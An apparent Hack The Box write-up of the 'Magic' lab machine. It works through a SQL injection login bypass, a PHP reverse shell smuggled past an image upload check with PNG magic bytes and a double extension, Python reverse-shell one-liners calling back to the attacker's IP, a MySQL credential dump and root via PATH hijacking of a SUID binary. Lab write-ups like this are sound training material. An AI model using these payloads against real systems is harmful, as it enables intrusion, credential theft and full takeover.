---
title: Magic
date: 2020-07-07
hero: /images/content/posts/hack-the-box/magic.png
categories:
- hack-the-box
tags:
- linux
- path-hijacking
- mysql
- magic-bytes
- owasp-top-10
---

This box was really cool for a few reasons. First off we bypass authentication using one of the OWASP Top 10, then continue to upload a reverse shell by tricking the web server into believing we are uploading a .png file. This is done through some file manipulation and double extensions. To get user we needed to dump a database and for root we hijacked the command flow. Really fun and challenging!

## Tools

* nmap
* ffuf
* Burp Suite
* msfvenom
* python3
* mysql

## Recon

If we do an `nmap`, `sudo nmap -sS -sV magic.htb -oA nmap/magic` we can see that there are only two services, SSH and a web server. Now that we know there is a web server I am going to work on enumerating the domain using `ffuf`. The command I used is `ffuf -u http://magic.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .txt,.html,.xml,.php -o ffuf/magic` I used some common extensions in hope of finding some interesting files. It looks like most of the stuff running is `.php`.

My scans did not show up much so I decided to try my hand at the login page. Inspecting the source code did not turn up much however I noticed that I did get the error message when using the character `'`. This is a sign for SQL injection. However I was not allowed to type spaces in the login box so I opened up Burp Suite and turned intercept on. When submitting the form page I entered my URL encoded payload for the `username`. My payload was `' OR 1=1--` then I URL encoded it to `%27%20or%201%3D1--`. After executing this payload we make it to the upload page. We can create a reverse shell payload. I am going to try and craft a `php` payload because I know the website will execute `php`. 

Okay so after a few hours of trial and error I figured out that we can craft the payload using this command `msfvenom -p php/reverse_php LHOST=10.10.14.2 LPORT=1337 -f raw > shell.php`. However we cannot just upload this file because the server requires the file type to be `.jpg`, `.jpeg`, or `.png`. Try changing the file name to `shell.png`, maybe that will work. Nope they check for that too... however if we add the **magic** bytes of a `.png` file to the shell then we can upload it. To add these bytes use the following command `printf "�PNG

" | cat - shell.php > shell.png`. We can then open up our listener with the command `nc -lvnp 1337`, then navigate to the file on the website at `http://magic.htb/images/uploads/shell.png`. If we inspect our listener we notice nothing is happening. Hmm what is going on. Well the web server has no reason to run a `.png` file. However if we name the file `shell.php.png` then the webserver will run it and it has the required file extension to pass the upload. Try crafting the payload again with the two extensions. Use the command `printf "�PNG

" | cat - shell.php > shell.php.png`. Then if we navigate to the image, here `http://magic.htb/images/uploads/shell.php.png`, we should see something return on our listener. I tried upgrading the shell with `python -c 'import pty; pty.spawn("/bin/sh")'` however nothing happened. I even tried to use `python3`, then the shell hung. It looks like we are just going to have to use the weakish shell. Oh well.

## User

Now that we are on the server we can begin to investigating the `www-data` directory. I found a file called `db.php5`. When I `cat`ed this file out I found the following information:

```
private static $dbName = 'Magic' ;
private static $dbHost = 'localhost' ;
private static $dbUsername = 'theseus';
private static $dbUserPassword = 'iamkingtheseus';
```

Let's see if we can use these credentials to `ssh` into the user `theseus`. Oops doesn't look like it. But I should be able to use `su`. If only my reverse shell would stop dying. Doesn't look like `su` is working either, and I could not get a stable shell to work unfortunately. However I just thought of a way to maybe get a stable reverse shell. I successfully exfiltrated a list of readable files by spawning a simple http server using the command `python3 -m http.server` in our weak shell. This gave me the idea to maybe spawn another reverse shell. Use the command `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.2",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'` in our weak instance and start to listen on port 1234 on your machine. Of course replace the IP address with your own internal IP. Now we have such a better shell, make sure you upgrade it using `python3 -c 'import pty; pty.spawn("/bin/sh")'`! Now we can see when we try to use the `su` command that we do not have the correct password. Well maybe there is something else on this machine that will use the password, like maybe the database that it corresponds too. So I was right. I could not find any database on the server, but with the command `mysqldump` we can use the credentials we found to dump the database because we have all the information we need. If I use the command `mysqldump -h localhost -u theseus -p Magic > db_backup.sql`, then we have created a plain text dump of the database. In here we find the following credentials:

```
admin::Th3s3usW4sK1ng
```

Turns out if we do `su` and use the password we are now the user `theseus`! What a relief to get user finally. Now onto the big goal.

## Root

Okay so I got `linPEAS` onto the machine and saw a file named `/bin/sysinfo`. At first I didn't know what to do because honestly that sounds like something that ships with the machine. However after some more research I found a CVE for it. unfortunately this didn't work because we are missing the `.mcsiwrapper`. So I continued to enumerate the machine for some time and was fixated for a while on the command `/sbin/init`. This does ship with the machine and isn't our target. I then ran `suid3num` which tells us which SUID scripts do not ship with the machine. This brought me back to `sysinfo` and decided to run `strings` on it. Turns out it does run escalated privileges, and it also uses a few commands, such as `fdisk` and `lshw`. If we were to maybe define our own version of one of these commands maybe we could execute some code as a privileged user. Here is how I crafted my payload.

```
theseus@ubuntu:~# cd /tmp
theseus@ubuntu:/tmp# touch fdisk
theseus@ubuntu:/tmp# chmod 777 fdisk
theseus@ubuntu:/tmp# export PATH=/tmp:$PATH
theseus@ubuntu:/tmp# echo bash > fdisk
theseus@ubuntu:/tmp# sysinfo
```

Okay so what is going on here? Well first we are moving to the `/tmp` directory and creating a file named `fdisk`. This is because we know that `sysinfo` uses a command called `fdisk`. Then we change the permissions of `fdisk` so that it can be executed. Next we need to prioritize the `/tmp` directory in out `PATH` so when `sysinfo` is looking for the location of `fdisk` it runs into our version first. Finally I echo the command I want to run into the `fdisk` file and then call `sysinfo`. Once we run `sysinfo` we spawn into a shell, but we cannot do anything, so then I created another reverse shell with the command `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.14.2",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`. I tried placing this command inside my `fdisk` file, but it would not execute for some reason. But now we are root! Congratulations, my first medium box is complete!

```
root@ubuntu:~# whoami
root
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
root@ubuntu:~# ifconfig | grep 10.10.10.185
inet 10.10.10.185  netmask 255.255.255.0  broadcast 10.10.10.255
root@ubuntu:~# hostname
ubuntu
```
